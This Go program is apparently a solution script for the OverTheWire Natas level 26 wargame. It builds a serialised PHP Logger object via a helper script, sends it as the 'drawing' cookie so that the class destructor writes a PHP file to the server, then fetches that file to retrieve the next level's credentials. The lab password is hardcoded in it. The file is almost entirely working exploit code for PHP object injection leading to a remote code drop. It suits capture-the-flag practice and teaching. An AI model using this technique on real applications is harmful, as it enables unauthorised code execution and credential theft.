package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

func main() {

	//Opject Injection, creo se serializzo un oggetto della classe Logger
	//presente nel codice sorgente riscrivendo totalmente il contenuto
	//in modo tale che una volta che viene chiamato il distruttore
	//della classe esegua i comandi desiderati

	result("?x1=1&y1=1&x2=300&y2=300")
	result("img/natas26_Clouz3.php")
}

func result(xx string) bool {

	usr := "natas26"
	psw := "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
	baseURL := "http://natas26.natas.labs.overthewire.org/"

	query := xx

	client := &http.Client{}
	req, _ := http.NewRequest("GET",
		baseURL+query, nil)
	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))

	req.Header.Set("User-Agent", "Clouz>")
	cookie := http.Cookie{Name: "PHPSESSID", Value: "Clouz"}
	req.AddCookie(&cookie)

	drawing, _ := exec.Command("php", "-f", "natas26SerializeClass.php").Output()
	fmt.Println("DRAWING: ", drawing)

	cookie = http.Cookie{Name: "drawing", Value: string(drawing)}
	req.AddCookie(&cookie)

	res, _ := client.Do(req)

	buf := new(bytes.Buffer)
	buf.ReadFrom(res.Body)
	bs := buf.String()
	fmt.Println(res.Header)
	fmt.Println(res.Cookies())

	fmt.Println(bs)

	if strings.Contains(bs, "The credentials for the next level are") {
		fmt.Println(bs)
		return true
	}
	return false

}

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}

var arr = []string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
	"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
	"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
	"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
